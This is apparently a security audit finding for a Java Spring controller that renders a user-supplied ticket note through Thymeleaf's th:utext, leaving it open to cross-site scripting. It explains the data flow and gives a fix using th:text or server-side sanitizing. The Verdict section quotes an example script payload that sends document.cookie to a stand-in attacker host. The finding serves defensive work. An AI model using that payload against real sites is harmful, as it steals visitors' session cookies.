## Verdict

Confirmed. The controller renders attacker-controlled input into an HTML response using Thymeleaf's `th:utext`, which emits its value without HTML-escaping. A submitter can post a `note` value such as `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>` and have it execute in the browser of anyone who views the rendered preview.

## Source

`submitterNote`, the `note` request parameter read in `previewTicketNote(@RequestParam("note") String submitterNote)` (line 24). It flows unmodified into `context.setVariable("note", submitterNote)` (line 29) and from there into the `note` variable referenced by the inline fragment.

## Fix

Change the fragment's attribute from `th:utext` to `th:text`:

```java
@PostMapping("/tickets/preview")
public String previewTicketNote(@RequestParam("note") String submitterNote) {
    // Renders a live preview of the submitted note using an inline Thymeleaf fragment
    String fragment = "<div class=\"ticket-note\" th:text=\"${note}\">Preview</div>";

    Context context = new Context();
    context.setVariable("note", submitterNote);

    return templateEngine.process(fragment, context);
}
```

`th:text` runs the expression result through Thymeleaf's standard HTML output escaping before insertion, so characters such as `<`, `>`, `&`, and `"` are rendered as their literal text rather than interpreted as markup. No other change is required: the surrounding `<div>` element still receives the note as its text content, so the visual output for legitimate notes (including notes containing forum-style formatting the user intended as plain text) is unaffected.

If the feature genuinely needs to let submitters include a constrained set of HTML tags (e.g. a rich-text note editor), do not restore `th:utext`. Instead sanitize `submitterNote` server-side with an HTML sanitizer that allowlists specific tags/attributes (e.g. OWASP Java HTML Sanitizer) before it reaches the template, and keep using `th:utext` only on the sanitized value - never on the raw request parameter.

## Explanation

Thymeleaf provides two attributes for inserting an expression's result as element content: `th:text`, which HTML-escapes the value, and `th:utext` ("unescaped text"), which inserts it verbatim. `th:utext` exists for cases where the value is already known to be safe, trusted markup (e.g. HTML assembled internally by the application) - it is not appropriate for values that originate from an HTTP request parameter, since nothing upstream of this code path validates or restricts the content of `note`.

Because the vulnerable line is the `TemplateEngine.process()` call and the unsafe rendering directive lives in the template fragment string itself (line 26), the fix has to change how the fragment tells Thymeleaf to output the variable, not add escaping around the `process()` call - Thymeleaf's escaping is controlled per-attribute in the template, not by the caller. Switching to `th:text` keeps the rest of the data flow (request parameter to context variable to rendered response) identical and only changes how that one value is serialized into the HTML output.
